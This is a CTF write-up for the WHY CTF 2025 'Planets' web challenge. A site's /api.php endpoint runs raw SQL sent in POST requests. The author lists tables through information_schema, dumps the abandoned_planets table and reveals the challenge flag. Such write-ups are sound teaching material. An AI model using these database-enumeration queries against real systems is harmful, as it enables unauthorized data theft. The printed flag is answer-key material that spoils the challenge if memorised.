---
title: "WHY CTF 2025"
date: 2025-08-14 12:00:00 +0300
categories: [CTF, Web]
tags: [SQLi]
author: raadalzyoud
description: "A detailed write-up of the WHY CTF 2025 challenge."
toc: true
comments: true
media_subpath: /assets/Web/
---
# Challenge Summary :
![Desktop View](/chall_planets.png){: width="600" height="350" }

The **Planets** challenge provided a beginner-friendly website featuring an overview of the solar system’s planets. The site fetched planet data from a backend API endpoint `/api.php` via POST requests containing raw SQL queries. The goal was to investigate potential vulnerabilities and retrieve any hidden flag from the database.

![Desktop View](/Screenshot 2025-08-10 031215.png){: width="600" height="350" }

# Initial Recon :

On inspecting the frontend code, the JavaScript `fetch` call stood out:

```javascript
fetch("/api.php", {
    method: "POST",
    body: "query=SELECT * FROM planets",
    headers: {"Content-type": "application/x-www-form-urlencoded; charset=UTF-8"},
})
```
This indicated the backend accepts and executes arbitrary SQL queries from the `query` parameter directly—an immediate red flag for a SQL injection vulnerability.

![Desktop View](/Screenshot 2025-08-10 031225.png){: width="600" height="350" }

# Database Enumeration  :

To confirm this, I attempted to enumerate the database tables by sending the following `payload` :

```query=SELECT table_name FROM information_schema.tables WHERE table_schema = database()```

`Response` : ```[
  {"TABLE_NAME":"abandoned_planets"},
  {"TABLE_NAME":"planets"}]```

![Desktop View](/Screenshot 2025-08-10 031429.png){: width="600" height="350" }

# The database contained two tables :

`planets` (expected, containing the main solar system planets).

`abandoned_planets` (potentially holding hidden or extra data).

# Data Extraction & Flag Discovery :
Focusing on the less obvious abandoned_planets table, I extracted all its contents :

![Desktop View](/Screenshot 2025-08-10 031459.png){: width="600" height="350" }

```[{
  "id":1,
  "name":"Pluto",
  "image":"pluto.png",
  "description":"Have you heard about Pluto? That's messed up right? flag{9c4dea2d8ae5681a75f8e670ac8ba999}"
}]
```
